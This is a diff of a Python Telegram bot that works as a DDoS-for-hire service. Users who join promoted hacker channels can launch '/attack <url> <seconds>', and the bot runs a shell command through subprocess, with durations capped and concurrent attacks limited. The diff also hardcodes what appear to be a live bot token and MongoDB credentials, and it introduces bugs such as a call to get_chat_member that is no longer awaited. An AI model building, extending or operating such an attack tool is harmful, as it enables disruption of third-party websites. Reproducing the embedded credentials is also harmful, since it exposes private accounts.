@@ -7,10 +7,11 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Call
 from pymongo import MongoClient
 
 # Configuration
-BOT_TOKEN = os.getenv("BOT_TOKEN", "7417294211:AAHD5mhZ2JUNN-PtcsAq75WwxFiG3I1Yx7k")
+BOT_TOKEN = "7417294211:AAHD5mhZ2JUNN-PtcsAq75WwxFiG3I1Yx7k"
 OWNER_IDS = [5606990991, 5460343986]
-MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://l2u341klu3:LhdzrrZpUMRaTYnS@cluster0.zs2ys.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
-CHANNELS = ["@Falcon_Security", "@Pbail_Squad", "@Found_Us", "@Bot_Colony"]
+MONGO_URL = "mongodb+srv://mpjmu808gh:8sqqX0ERW0IMtviu@cluster0.zo6rkop.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+WEBAPP_URL = "https://iosmirror.cc/home?app=1"
+CHANNELS = ["@Falcon_Security", "@Pbail_squad", "@Found_Us", "@Bot_Colony"]
 
 # MongoDB Client Setup
 client = MongoClient(MONGO_URL)
@@ -31,7 +32,7 @@ async def start(update: Update, context: CallbackContext):
         [InlineKeyboardButton("Join Falcon Security", url="https://t.me/Falcon_Security"),
          InlineKeyboardButton("Pbail Squad", url="https://t.me/Pbail_Squad")],
         [InlineKeyboardButton("Indian Hacker", url="https://t.me/Found_Us"),
-         InlineKeyboardButton("Join Blackhat", url="https://t.me/Bot_Colony")],
+         InlineKeyboardButton("Join Blackhat", url="https://t.me/Bot_colony")],
         [InlineKeyboardButton("Verify", callback_data="verify")]
     ]
     keyboard = InlineKeyboardMarkup(buttons)
@@ -44,9 +45,10 @@ async def verify(update: Update, context: CallbackContext):
     query = update.callback_query
     user_id = query.from_user.id
 
-    member_statuses = [await context.bot.get_chat_member(channel, user_id) for channel in CHANNELS]
-    if all(member.status in ['member', 'administrator', 'creator'] for member in member_statuses):
-        await query.edit_message_text("Verification successful! You can now use the bot.")
+    if all(context.bot.get_chat_member(channel, user_id).status in ['member', 'administrator', 'creator'] for channel in CHANNELS):
+        await query.edit_message_text("Verification successful! You can now use the bot.\n\n"
+                                      "To attack a site, use the command:\n/attack {url} {time in seconds}\n\n"
+                                      "Note: Maximum attack duration is 200 seconds. Only 2 attacks can run simultaneously.")
     else:
         await query.edit_message_text("Please join all required channels first.")
 
@@ -58,14 +60,17 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     if len(active_attacks) >= 2:
-        attack_info = "\n".join([f"Attack {i+1}: {data['url']} - {data['remaining']}s left"
-                                 for i, data in enumerate(active_attacks.values())])
-        await update.message.reply_text(f"Two attacks are currently in progress:\n{attack_info}")
+        remaining_times = [data['remaining'] for data in active_attacks.values()]
+        min_remaining = min(remaining_times)
+        await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
+                                        f"Time left for current attacks: {min_remaining} seconds.")
         return
 
     try:
         url = context.args[0]
         duration = int(context.args[1])
+        if duration > 200:
+            duration = 200
     except (IndexError, ValueError):
         await update.message.reply_text("Usage: /attack <url> <duration>")
         return
@@ -82,14 +87,9 @@ def execute_attack(attack_id, update):
 
     try:
         subprocess.run(command, shell=True, check=True)
-        # Ensure that Telegram API calls are done in the main thread
-        def send_message():
-            update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
-        threading.Thread(target=send_message).start()
+        update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
     except subprocess.CalledProcessError:
-        def send_message():
-            update.message.reply_text("Failed to start the attack.")
-        threading.Thread(target=send_message).start()
+        update.message.reply_text("Failed to start the attack.")
     finally:
         del active_attacks[attack_id]
 
@@ -101,7 +101,7 @@ async def blacklist(update: Update, context: CallbackContext):
     try:
         user_id = int(context.args[0])
     except (IndexError, ValueError):
-        await update.message.reply_text("Usage: /blacklist <user_id>")
+        await update.message.reply_text("Usage: /Blacklist <user_id>")
         return
 
     blacklist_collection.insert_one({"user_id": user_id})
@@ -114,7 +114,7 @@ async def rm_blacklist(update: Update, context: CallbackContext):
     try:
         user_id = int(context.args[0])
     except (IndexError, ValueError):
-        await update.message.reply_text("Usage: /rmblacklist <user_id>")
+        await update.message.reply_text("Usage: /rmBlacklist <user_id>")
         return
 
     blacklist_collection.delete_one({"user_id": user_id})
@@ -124,7 +124,7 @@ async def stats(update: Update, context: CallbackContext):
     if update.message.from_user.id not in OWNER_IDS:
         return
 
-    total_users = stats_collection.count_documents({})
+    total_users = stats_collection.estimated_document_count()
     active_users = len(active_attacks)
     await update.message.reply_text(f"Total users: {total_users}\nActive attacks: {active_users}")
 
@@ -151,11 +151,11 @@ app = Application.builder().token(BOT_TOKEN).build()
 
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CallbackQueryHandler(verify, pattern="verify"))
-app.add_handler(CommandHandler("attack", attack, filters=filters.ChatType.PRIVATE))
-app.add_handler(CommandHandler("blacklist", blacklist, filters=filters.ChatType.PRIVATE))
-app.add_handler(CommandHandler("rmblacklist", rm_blacklist, filters=filters.ChatType.PRIVATE))
-app.add_handler(CommandHandler("stats", stats, filters=filters.ChatType.PRIVATE))
-app.add_handler(CommandHandler("broadcast", broadcast, filters=filters.ChatType.PRIVATE))
+app.add_handler(CommandHandler("attack", attack))
+app.add_handler(CommandHandler("Blacklist", blacklist))
+app.add_handler(CommandHandler("rmBlacklist", rm_blacklist))
+app.add_handler(CommandHandler("Stats", stats))
+app.add_handler(CommandHandler("Broadcast", broadcast))
 app.add_error_handler(error_handler)
 
 # Start the Bot
